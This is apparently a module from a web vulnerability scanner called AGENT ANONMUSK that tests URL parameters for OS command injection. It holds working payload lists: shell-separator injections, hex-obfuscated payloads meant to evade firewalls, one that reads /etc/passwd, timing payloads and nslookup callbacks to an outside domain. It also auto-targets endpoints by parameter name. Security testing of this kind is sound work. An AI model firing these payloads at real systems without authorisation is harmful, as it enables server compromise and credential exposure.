"""
AGENT ANONMUSK — Command Injection Engine
=========================================
Tests for OS command injection with hex-style obfuscation.
"""

from __future__ import annotations

import logging
import re
import time

from core.context import Evidence, Finding, Severity, VulnType
from modules.base import BaseModule
from utils.http_client import HTTPClient

logger = logging.getLogger("AGENT ANONMUSK.injection.cmdi")

# ── Canary + Detection ───────────────────────────────────────
CANARY = "AGENT ANONMUSK_cmdi_7x3k"

# Command injection payloads
CMDI_PAYLOADS = [
    # Basic separators
    f"; echo {CANARY}",
    f"| echo {CANARY}",
    f"|| echo {CANARY}",
    f"& echo {CANARY}",
    f"&& echo {CANARY}",
    f"`echo {CANARY}`",
    f"$(echo {CANARY})",
    f"; echo {CANARY} #",
    f"| echo {CANARY} #",

    # Newline injection
    f"%0aecho {CANARY}",
    f"%0d%0aecho {CANARY}",

    # Backtick
    f"`echo {CANARY}`",
]

# Hex-obfuscated payloads (PRD requirement: 72 6d style)
HEX_PAYLOADS = [
    "; $(printf '\\x65\\x63\\x68\\x6f') " + CANARY,           # echo
    "| $(printf '\\x63\\x61\\x74') /etc/passwd",              # cat
    "; $(printf '\\x69\\x64')",                                 # id
    "; $(printf '\\x77\\x68\\x6f\\x61\\x6d\\x69')",           # whoami
]

# Windows-specific payloads
WINDOWS_PAYLOADS = [
    f"& echo {CANARY}",
    f"| echo {CANARY}",
    f"; echo {CANARY}",
    "| dir",
    "& whoami",
]

# Time-based blind payloads
TIME_PAYLOADS = [
    "; sleep {delay}",
    "| sleep {delay}",
    "|| sleep {delay}",
    "& timeout /t {delay}",        # Windows
    "; ping -c {delay} 127.0.0.1",  # Cross-platform timing
]

# DNS callback payloads (for out-of-band detection)
DNS_PAYLOADS = [
    "; nslookup {canary}.{callback_domain}",
    "| nslookup {canary}.{callback_domain}",
    "$(nslookup {canary}.{callback_domain})",
]


class CommandInjectionEngine(BaseModule):
    """
    OS Command Injection testing with:
    1. Inline echo canary detection
    2. Hex-obfuscated payloads (WAF evasion)
    3. Time-based blind detection
    """

    MODULE_NAME = "command_injection"

    async def run(self) -> None:
        self._log_start("Testing for command injection...")

        target_urls = self._attack_params.get("target_urls", [])
        params_to_test = self._attack_params.get("parameters", [])

        if not target_urls:
            # Find endpoints with file/path/cmd parameters
            cmd_keywords = ["file", "path", "cmd", "exec", "command",
                            "run", "ping", "host", "ip", "dir", "folder"]
            target_urls = [
                ep.url for ep in self.ctx.endpoints
                if any(kw in p.lower() for p in ep.params for kw in cmd_keywords)
            ]

        if not target_urls:
            self._log_complete("No suitable endpoints for command injection testing")
            return

        blind_delay = self.config.get("attack", {}).get("blind_injection_delay", 5)
        scan_config = self.config.get("scanning", {})

        async with HTTPClient(
            scope=self.scope,
            rate_limit=scan_config.get("rate_limit", 5),
            timeout=max(scan_config.get("request_timeout", 15), blind_delay + 10),
        ) as client:
            for url in target_urls[:15]:
                await self._test_endpoint(client, url, params_to_test, blind_delay)

        self._log_complete("Command injection testing complete")

    async def _test_endpoint(
        self,
        client: HTTPClient,
        url: str,
        params_filter: list[str],
        blind_delay: int,
    ):
        """Test a single endpoint for command injection."""
        from urllib.parse import urlparse, parse_qs

        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)

        for param_name in params:
            if params_filter and param_name not in params_filter:
                continue

            # 1. Try inline payloads (canary echo)
            if await self._test_inline(client, url, param_name):
                continue

            # 2. Try hex-obfuscated payloads
            if await self._test_hex(client, url, param_name):
                continue

            # 3. Try time-based blind
            await self._test_time_blind(client, url, param_name, blind_delay)

    async def _test_inline(
        self, client: HTTPClient, url: str, param: str
    ) -> bool:
        """Test with inline echo canary."""
        for payload in CMDI_PAYLOADS:
            test_url = self._inject_param(url, param, payload)
            try:
                resp, evidence = await client.get(test_url)
                if CANARY in resp.text:
                    self._report_finding(
                        url, param, payload, "inline", evidence
                    )
                    return True
            except Exception as e:
                logger.debug("CMD injection test failed: %s", e)
        return False

    async def _test_hex(
        self, client: HTTPClient, url: str, param: str
    ) -> bool:
        """Test with hex-obfuscated payloads."""
        for payload in HEX_PAYLOADS:
            test_url = self._inject_param(url, param, payload)
            try:
                resp, evidence = await client.get(test_url)
                # Check for typical command output
                if self._detect_command_output(resp.text):
                    self._report_finding(
                        url, param, payload, "hex-obfuscated", evidence
                    )
                    return True
            except Exception as e:
                logger.debug("Hex CMD test failed: %s", e)
        return False

    async def _test_time_blind(
        self, client: HTTPClient, url: str, param: str, delay: int
    ) -> bool:
        """Test with time-based blind detection."""
        for payload_template in TIME_PAYLOADS:
            payload = payload_template.format(delay=delay)
            test_url = self._inject_param(url, param, payload)
            try:
                start = time.monotonic()
                resp, evidence = await client.get(test_url)
                elapsed = time.monotonic() - start

                if elapsed >= delay * 0.8:
                    self._report_finding(
                        url, param, payload, "time-blind",
                        evidence, confidence=0.7,
                    )
                    return True
            except Exception as e:
                logger.debug("Time-blind CMD test failed: %s", e)
        return False

    def _report_finding(
        self,
        url: str,
        param: str,
        payload: str,
        method: str,
        evidence: Evidence,
        confidence: float = 0.9,
    ):
        """Report a command injection finding."""
        finding = Finding(
            title=f"OS Command Injection ({method}) in '{param}' at {url}",
            vuln_type=VulnType.CMDI,
            severity=Severity.CRITICAL,
            description=(
                f"OS command injection detected via {method} method.\n\n"
                f"Parameter: {param}\n"
                f"Payload: {payload}\n\n"
                f"An attacker can execute arbitrary OS commands on the server."
            ),
            evidence=[evidence],
            confidence=confidence,
            target_url=url,
            parameter=param,
            payload=payload,
            remediation=(
                "1. Never pass user input directly to OS commands\n"
                "2. Use language-native APIs instead of shell commands\n"
                "3. If shell commands are required, use allowlists for valid inputs\n"
                "4. Implement strict input validation (alphanumeric only)"
            ),
        )
        self.ctx.add_finding(finding)
        logger.warning("💀 Command injection found: %s [%s]", url, method)

    @staticmethod
    def _detect_command_output(body: str) -> bool:
        """Detect typical command output patterns."""
        patterns = [
            re.compile(r"root:.*:0:0:", re.IGNORECASE),        # /etc/passwd
            re.compile(r"uid=\d+\(", re.IGNORECASE),           # id command
            re.compile(r"\\[a-zA-Z]:\\", re.IGNORECASE),       # Windows path
            re.compile(r"www-data|apache|nginx", re.IGNORECASE),  # Linux users
        ]
        return any(p.search(body) for p in patterns)

    @staticmethod
    def _inject_param(url: str, param: str, value: str) -> str:
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[param] = [value]
        flat = {k: v[0] for k, v in params.items()}
        return urlunparse(parsed._replace(query=urlencode(flat, quote_via=quote)))
